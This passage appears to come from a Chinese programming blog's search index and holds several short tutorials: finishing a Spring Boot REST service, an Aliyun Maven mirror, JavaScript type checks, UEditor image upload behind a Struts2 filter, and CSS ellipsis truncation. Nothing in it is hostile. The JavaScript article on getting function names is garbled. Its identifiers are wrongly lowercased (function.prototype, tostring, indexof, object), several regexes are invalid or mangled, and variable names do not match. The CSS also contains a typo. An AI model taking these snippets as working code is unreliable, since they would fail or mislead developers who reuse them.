<p>该代码使用Spring4的新<code>@RestController</code>注解，这标志着类作为控制器，每一个方法返回一个域对象来代替视图。它是<code>@Controller</code>和<code>@ResponseBody</code>混在一起的简写。</p>
<p><code>Greeting</code>对象必须转换成JSON。由于Spring的HTTP消息转换器的支持，你不需要手动做这种转换。因为Jackson 2是在类路径中，Spring的MappingJackson2HttpMessageConverter自动选择<code>Greeting</code>实例转换为JSON。</p>
<h4 id="使用程序可以执行"><a href="#使用程序可以执行" class="headerlink" title="使用程序可以执行"></a>使用程序可以执行</h4><p>尽管有可能封装该服务作为用于部署的传统WAR文件到外部应用服务器，更简单的方法表现出以下创建一个独立的应用程序。打包所有文件为单一的可执行的JAR文件，用一个良好的Java main()方法来驱动。一路上，你可以使用Spring的嵌入Tomcat servlet容器作为HTTP运行替代部署到外部容器实例上。</p>
<p><code>src/main/java/hello/Application.java</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package hello;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class Application &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>@SpringBootApplication</code>是一个方便的注解，它包含下面所有的注解：</p>
<ul>
<li><p><code>@Configuration</code>标记一个类来作为bean定义的应用程序上下文来源</p>
</li>
<li><p><code>@EnableAutoConfiguration</code>告诉spring boot 基于类路径添加beans，其他beans和各个属性设置。</p>
</li>
<li><p>通常你会添加<code>@EnableWebMvc</code>到Spring MVC的应用程序，但是当它看到的类路径上有spring-webmvc时会自动添加这个注解。它标志着程序是一个Web应用程序，并激活关键行为，如设置DispatcherServlet。</p>
</li>
<li><p><code>@ComponentScan</code>告诉spring去查找在hello包下的其它组件，配置和服务，允许它找到HelloController。</p>
</li>
</ul>
<p><code>main()</code>方法使用spring boot的<code>SpringApplication.run()</code>方法来启动应用程序。你有没有注意到没有一行XML？没有web.xml文件，这个Web应用程序是100％纯Java并且你没有要处理任何配置。</p>
<h4 id="编译一个可执行jar"><a href="#编译一个可执行jar" class="headerlink" title="编译一个可执行jar"></a>编译一个可执行jar</h4><p>您可以从Gradle或Maven命令行运行应用或者你可以建立一个包含所有必要的依赖，类和资源的一个可执行的JAR文件并运行。这样便于在不同的环境传输，版本和部署服务在整个开发生命周期的应用程序，等等</p>
<p>如果你使用Gradle，你可以使用<code>./gradlew bootRun</code>运行程序，或者你可以使用<code>./gradlew build</code>编译一个jar，然后运行jar文件：</p>
<p><code>java -jar build/libs/gs-rest-service-0.1.0.jar</code></p>
<p>如果你使用Maven，你使用<code>./mvnw spring-boot:run</code>运行程序，或者你可以使用<code>./mvnw clean package</code>编译一个jar，然后运行jar文件：</p>
<p><code>java -jar target/gs-rest-service-0.1.0.jar</code></p>
<blockquote>
<p>上述过程将创建一个可运行的JAR。您也可以选择<a href="http://spring.io/guides/gs/convert-jar-to-war/" target="_blank" rel="noopener">编译一个经典的WAR文件</a>来代替。</p>
</blockquote>
<p>日志输出显示后。服务应该启动并运行在几秒钟之内。</p>
<h4 id="测试服务"><a href="#测试服务" class="headerlink" title="测试服务"></a>测试服务</h4><p>现在，该服务已启动，访问<code>http://localhost:8080/greeting</code>，你会看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;content&quot;:&quot;Hello, World!&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>提供查询字符串参数<code>name</code>：<a href="http://localhost:8080/greeting?name=User" target="_blank" rel="noopener">http://localhost:8080/greeting?name=User</a></p>
<p>注意<code>content</code>属性从”Hello, World!”变成”Hello, User!”：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:2,&quot;content&quot;:&quot;Hello, User!&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这一变化表明，在<code>GreetingController</code>的<code>@RequestParam</code>安排按预期工作，name参数被赋予了默认值”World”，但始终可以通过查询字符串显式覆盖。</p>
<p>还要注意为何<code>id</code>属性已经从<code>1</code>改为<code>2</code>，这证明了你的工作对跨多个请求相同<code>GreetingController</code>实例，它的计数器字段被每次调用增加一次。</p>
<blockquote>
<p>表明spring controller默认是单例的</p>
</blockquote>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>恭喜！你刚刚使用Spring开发RESTful Web服务</p>
<blockquote>
<p>原文链接：<a href="http://spring.io/guides/gs/rest-service/" target="_blank" rel="noopener">http://spring.io/guides/gs/rest-service/</a></p>
</blockquote>
<p> 
 
 
 </p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> spring boot </tag>
            
            <tag> restful </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[国内好用的maven仓库]]></title>
      <url>/2016/maven-repository/</url>
      <content type="html"><![CDATA[<p>国内最好的maven repository</p>
<a id="more"></a>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改setting.xml</p>
<p>在\&lt;/mirrors>前添加上面的那段代码即可</p>
<p>如果是在project中使用</p>
<p>在\&lt;/project>之前加上下面的代码就可以使用了</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> maven </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[javascript获取函数名称、函数参数、对象属性名称的代码实例]]></title>
      <url>/2016/js-get-function-name/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 javascript获取函数名称、函数参数、对象属性名称的代码实例</p>
<h2 id="一、获取函数名称的3种实现方法"><a href="#一、获取函数名称的3种实现方法" class="headerlink" title="一、获取函数名称的3种实现方法"></a>一、获取函数名称的3种实现方法</h2><h3 id="实例1："><a href="#实例1：" class="headerlink" title="实例1："></a>实例1：</h3><p>在js权威指南中看到的一个方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>.<span class="title">prototype</span>.<span class="title">getname</span> = <span class="title">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">this</span>.name || <span class="keyword">this</span>.tostring().match(<span class="regexp">/function\s(()(/</span>)[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="实例2："><a href="#实例2：" class="headerlink" title="实例2："></a>实例2：</h3><p>如果当前函数是有名函数，则返回其名字，如果是匿名函数则返回被赋值的函数变量名，如果是闭包中匿名函数则返回“anonymous”。<br>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getfnname = <span class="function"><span class="keyword">function</span>(<span class="params">callee</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> _callee = callee.tostring().replace(<span class="regexp">/[\s\?]*/g</span>,<span class="string">""</span>),</span><br><span class="line">	comb = callee.length &gt;= <span class="number">50</span> ? <span class="number">50</span> :callee.length;</span><br><span class="line">	_callee = _callee.substring(<span class="number">0</span>,comb);</span><br><span class="line">	<span class="keyword">var</span> name = _callee.match(<span class="regexp">/^function((+?)(/</span>);</span><br><span class="line">	<span class="keyword">if</span>(name &amp;&amp; name[<span class="number">1</span>])&#123;</span><br><span class="line">		<span class="keyword">return</span> name[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> caller = callee.caller, _caller = caller.tostring().replace(<span class="regexp">/[\s\?]*/g</span>,<span class="string">""</span>);</span><br><span class="line">	<span class="keyword">var</span> last = caller.indexof(callee),</span><br><span class="line">	str = _caller.substring(last<span class="number">-30</span>,last);</span><br><span class="line">	name = str.match(<span class="regexp">/var(\=+?)\=/</span>);</span><br><span class="line">	<span class="keyword">if</span>(name &amp;&amp; name[<span class="number">1</span>])&#123;</span><br><span class="line">		<span class="keyword">return</span> name[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"anonymous"</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>使用：在要调查的函数内部执行此函数，传入一个参数，为arguments.callee。<br>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ee</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//+++++++++++++++++++++++++++++++++</span></span><br><span class="line">	<span class="keyword">var</span> fnname =getfnname(<span class="built_in">arguments</span>.callee);</span><br><span class="line">	<span class="comment">//+++++++++++++++++++++++++++++++++</span></span><br><span class="line">	alert(fnname);</span><br><span class="line">&#125;;</span><br><span class="line">ee();</span><br></pre></td></tr></table></figure>
<h3 id="实例3："><a href="#实例3：" class="headerlink" title="实例3："></a>实例3：</h3><p>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getfuncname</span>(<span class="params">_callee</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> _text = _callee.tostring();</span><br><span class="line">	<span class="keyword">var</span> _scriptarr = <span class="built_in">document</span>.scripts;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;_scriptarr.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> start = _scriptarr[i].text.indexof(text);</span><br><span class="line">		<span class="keyword">if</span> (_start != <span class="number">-1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="regexp">/^function\s(.).*\r\n/</span>.test(_text)) &#123;</span><br><span class="line">				<span class="keyword">var</span> _temparr = _scriptarr[i].text.substr(<span class="number">0</span>, _start).split(<span class="string">'\r\n'</span>);</span><br><span class="line">				<span class="keyword">return</span> temparr[temparr.length - <span class="number">1</span>].replace(<span class="regexp">/(var)|(\s*)/g</span>, <span class="string">''</span>).replace(<span class="regexp">/=/g</span>, <span class="string">''</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">return</span> _text.match(<span class="regexp">/^function\s((+).\r\n/</span>)[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> getfuncname(<span class="built_in">arguments</span>.callee);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> getfuncname(<span class="built_in">arguments</span>.callee);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.alert(a());</span><br><span class="line"><span class="built_in">window</span>.alert(b());</span><br></pre></td></tr></table></figure>
<p>以上的方法还有一个情况没法解决，希望有办法的能给出指点。<br>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = &#123;</span><br><span class="line">	run : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> getfuncname(<span class="built_in">arguments</span>.callee);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.alert(x.run());</span><br></pre></td></tr></table></figure>
<p>这个情况下无法得到函数的名称；<br>二、js获取函数的所有参数和遍历某个对象所有的属性名称和值的方法<br>1.获取所有参数<br>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">arguments</span>.length;i++)</span><br><span class="line">		<span class="built_in">document</span>.write(<span class="built_in">arguments</span>[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.遍历某个对象所有的属性名称和值的方法<br>代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> object();</span><br><span class="line">obj.myname = <span class="string">"我是对象"</span>;</span><br><span class="line">obj.pro2 = <span class="string">"23"</span>;</span><br><span class="line">obj.pro3 = <span class="string">"abcdeg"</span>; <span class="comment">//php程序员站</span></span><br><span class="line"><span class="keyword">for</span> (items <span class="keyword">in</span> obj)&#123;</span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">"属性:"</span>+items+<span class="string">"的值是 ("</span>+ obj[items] +<span class="string">")"</span>);</span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 闭包 </tag>
            
            <tag> xxzkid </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[js进行类型判断 Object.prototype.toString.call()]]></title>
      <url>/2015/js-class/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 js进行类型判断 Object.prototype.toString.call()</p>
<p>首先看一段ECMA中对Object.prototype.toString的解释：<br>Object.prototype.toString( )<br>When the toString method is called, the following steps are taken:</p>
<ol>
<li>Get the [[Class]] property of this object.</li>
<li>Compute a string value by concatenating the three strings “[object “, Result (1), and “]”.</li>
<li>Return Result (2)<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var oP = Object.prototype,</span><br><span class="line">toString = oP.toString;</span><br><span class="line"> </span><br><span class="line">console.log(toString.call([123]));//[object Array]</span><br><span class="line">console.log(toString.call(&apos;123&apos;));//[object String]</span><br><span class="line">console.log(toString.call(&#123;a: &apos;123&apos;&#125;));//[object Object]</span><br><span class="line">console.log(toString.call(/123/));//[object RegExp]</span><br><span class="line">console.log(toString.call(123));//[object Number]</span><br><span class="line">console.log(toString.call(undefined));//[object Undefined]</span><br><span class="line">console.log(toString.call(null));//[object Null]</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> prototype </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[UEditor1.3.6图片上传]]></title>
      <url>/2015/ueditor1-3-6-pic-upload/</url>
      <content type="html"><![CDATA[<p>项目中使用的UEditor是1.3.6版本</p>
<h3 id="ueditor目录结构"><a href="#ueditor目录结构" class="headerlink" title="ueditor目录结构"></a>ueditor目录结构</h3><p>最新的版本上传的东西都封装到jar包了，自定义很困难。</p>
<ol>
<li>首先下载UEditor</li>
<li>解压缩UEditor，会看到一下目录：</li>
</ol>
<a id="more"></a>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fknvohidioj20fi08vgnr.jpg" alt=""></p>
<p>把除了index.html的文件全部拷贝到project的根目录下（如图）：</p>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fknvpc49tbj20730cqjsf.jpg" alt=""></p>
<h3 id="ueditor使用方法"><a href="#ueditor使用方法" class="headerlink" title="ueditor使用方法"></a>ueditor使用方法</h3><p>如果要在项目中使用UEditor，在需要显示的地方加入如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/test/add.action"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 加载编辑器的容器 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">type</span>=<span class="string">"text/plain"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">            这里写你的初始化内容</span></span><br><span class="line"><span class="undefined">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"ueditor.config.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 编辑器源码文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"ueditor.all.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 实例化编辑器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> editor = UE.getEditor(<span class="string">'container'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果需要定制编辑器上的工具栏：</p>
<p>可以参考：官方网站或者参考我的博客<a href="http://blog.uyiplus.com/ueditor-use-and-config" target="_blank" rel="noopener"></a></p>
<p>用到图片上传的地方我们打开jsp目录：</p>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fknvsvilaij206y0bctal.jpg" alt=""></p>
<p>把相应的jar包添加到web-inf/lib目录下</p>
<p>图片上传使用的是imageUp.jsp文件</p>
<p>打开文件，发现会报错，我们把Uploader.java文件放到src下把它移动到相应的package中。</p>
<p>com.baidu.ueditor.um</p>
<p>imageUp.jsp文件不需要改动，如果你要修改上传文件的路径，需要修改两个地方。</p>
<ol>
<li>修改com.baidu.ueditor.um.Uploader#upload()方法；</li>
</ol>
<ol>
<li>如果不是上传本地服务器上，则需要修改前端的ueditor.config.js文件</li>
</ol>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fknvtfi7akj20er04nq4l.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/afc434bdly1fknvtoqsaaj20eg074q4v.jpg" alt=""></p>
<ol>
<li>如果上传到本地的服务器，则不需要修改配置。以上是上传到非本项目的web服务器；</li>
</ol>
<p>注意，如果项目中使用了struts2，那么还需要自定义一个拦截器。不然struts2的默认拦截器会把上传的文件拦截掉，无法上传。</p>
<p>会出现：</p>
<ol>
<li>无效的action</li>
</ol>
<ol>
<li>未找到数据</li>
</ol>
<p>自定义拦截器为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UEditorFilter</span> <span class="keyword">extends</span> <span class="title">StrutsPrepareAndExecuteFilter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Loggerlog = Logger.getLogger(UEditorFilter.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponseres,</span></span></span><br><span class="line"><span class="function"><span class="params">            FilterChain chain)</span><span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest)req;</span><br><span class="line">        String url = request.getRequestURI();        </span><br><span class="line">        System.out.println(url);</span><br><span class="line">        <span class="keyword">if</span> (url.contains(request.getContextPath() +<span class="string">"/ueditor/jsp/"</span>)) &#123;            </span><br><span class="line">        log.debug(<span class="string">"使用自定义过滤器"</span>);</span><br><span class="line">            chain.doFilter(req,res);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;            </span><br><span class="line">        log.debug(<span class="string">"使用默认过滤器"</span>);</span><br><span class="line">            <span class="keyword">super</span>.doFilter(req,res,chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在web.xml中修改一下struts2的配置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.xxz.action.UEditorFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> ueditor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS 限制字数，超出隐藏]]></title>
      <url>/2015/css-limit-hidden/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 CSS 限制字数，超出隐藏</p>
<p>先看看CSS代码：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.dd &#123;</span><br><span class="line">    border: solid 1px gray;</span><br><span class="line">    width: 180px;</span><br><span class="line">    course: hand;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    white-space: nowrap;</span><br><span class="line">    text-overflow: ellipsis; /* for IE */</span><br><span class="line">    -o-text-overflow: ellipsis; /* for Opera */</span><br><span class="line">    -icab-text-overflow: ellipsis; /* for iCab */</span><br><span class="line">    -khtml-text-overflow: ellipsis; /* for Konqueror Safari */</span><br><span class="line">    -moz-text-overflow: ellipsis; /* for Firefox,mozilla */</span><br><span class="line">    -webkit-text-overflow: ellipsis; /* for Safari,Swift*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以直接添加在div，span上</p>
<p>如果要在table的td 上控制，则要在table上添加样式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style=&quot;table-layout: fixed;word-wrap:break-word;&quot;</span><br></pre></td></tr></table></figure></p>
]]></content>
